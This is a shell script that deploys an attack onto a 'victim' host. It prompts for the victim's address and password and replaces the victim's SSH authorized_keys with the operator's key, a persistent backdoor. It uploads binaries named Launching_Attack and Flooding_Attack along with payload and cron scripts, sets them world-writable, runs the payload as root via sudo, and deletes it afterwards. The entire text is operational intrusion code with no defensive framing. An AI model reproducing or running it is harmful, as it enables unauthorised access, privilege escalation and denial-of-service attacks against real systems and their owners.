echo "Enter Victim IP : \c"
read ip
echo "Enter Victim Port : \c"
read port
echo "Enter Victim Password : \c"
stty -echo
read pw
echo $pw>./password.txt
stty echo
echo "\n"


[ ! -f ~/.ssh/id_rsa ] && ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
[ -f ~/.ssh/id_rsa ] && ssh-add ~/.ssh/id_rsa
sshpass -f ./password.txt scp -P $port -q ~/.ssh/id_rsa.pub victim@$ip:~/.ssh/authorized_keys
scp -P $port -q ./Launching_Attack victim@$ip:~/
scp -P $port -q ./Launching_Attack_Backup victim@$ip:~/
scp -P $port -q ./Flooding_Attack victim@$ip:~/
scp -P $port -q ./payload.sh victim@$ip:~/
scp -P $port -q ./cron.sh victim@$ip:~/
ssh victim@$ip -t "chmod 777 ~/Launching_Attack; chmod 777 ~/Launching_Attack_Backup; chmod 777 ~/Flooding_Attack; chmod 777 ~/payload.sh; echo $pw | sudo -S sudo sh ~/payload.sh; rm -f ~/payload.sh;"
